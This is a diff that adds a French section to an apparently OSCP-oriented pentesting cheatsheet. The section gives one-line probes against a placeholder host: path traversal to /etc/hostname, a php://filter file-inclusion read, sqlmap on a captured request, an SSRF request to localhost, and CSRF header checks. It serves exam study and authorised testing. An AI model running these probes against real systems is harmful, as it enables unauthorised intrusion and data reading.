@@ -3841,6 +3841,66 @@ CVE-2018-18619 https://www.exploit-db.com/exploits/45853 Advanced Comment System
 
 ```
 
+
+## Contrôles web complémentaires
+
+Adapter les chemins, paramètres et méthodes à l'application réellement observée. Les exemples utilisent des valeurs de démonstration et ne constituent pas une preuve automatique de vulnérabilité.
+
+### Traversée de chemin (Path Traversal)
+
+Conserver les segments ../ lors de l'envoi d'une requête HTTP ; certains clients normalisent sinon le chemin avant transmission.
+
+<p class="oscp-command-note">Traversée de chemin (Path Traversal).</p>
+
+```bash
+curl --path-as-is 'http://<HOTE_CIBLE>/download/../../../../etc/hostname'
+```
+
+### Inclusion locale : lecture via un filtre PHP
+
+Lorsque l'application utilise PHP et un paramètre d'inclusion, tester la présence du flux php://filter sans exécuter de code.
+
+<p class="oscp-command-note">Inclusion locale : lecture via un filtre PHP.</p>
+
+```bash
+curl -G --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' 'http://<HOTE_CIBLE>/index.php'
+```
+
+### SQLi : travailler depuis une requête enregistrée
+
+Utiliser une requête HTTP capturée dans un fichier pour cibler un paramètre précis lors de l'analyse.
+
+<p class="oscp-command-note">SQLi : travailler depuis une requête enregistrée.</p>
+
+```bash
+sqlmap -r <REQUETE_HTTP>.txt -p <PARAMETRE> --batch
+```
+
+### SSRF : distinguer client et serveur
+
+Lorsqu'une fonctionnalité récupère une URL, vérifier depuis quel composant la requête part. L'endpoint /fetch est illustratif : le remplacer par le vrai paramètre observé.
+
+<p class="oscp-command-note">SSRF : distinguer client et serveur.</p>
+
+```bash
+curl -i -G --data-urlencode 'url=http://127.0.0.1:8080/' 'http://<HOTE_CIBLE>/fetch'
+```
+
+### CSRF : observer le contexte de protection
+
+Examiner les en-têtes et cookies de session. Une requête POST ne permet pas, à elle seule, de conclure à une faille CSRF.
+
+<p class="oscp-command-note">CSRF : observer le contexte de protection.</p>
+
+```bash
+curl -i -X OPTIONS 'http://<HOTE_CIBLE>/profil'
+curl -i 'http://<HOTE_CIBLE>/profil'
+```
+
+**Référence technique complémentaire :** [Notes OSCP de krovs](https://github.com/krovs/oscp-notes/blob/main/docs/11_web_attacks.md). Cette synthèse conserve la structure de SKILL-ISSUE et reformule les explications.
+
+<!-- notes-krovs-2026 -->
+
 ---
 
 Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).
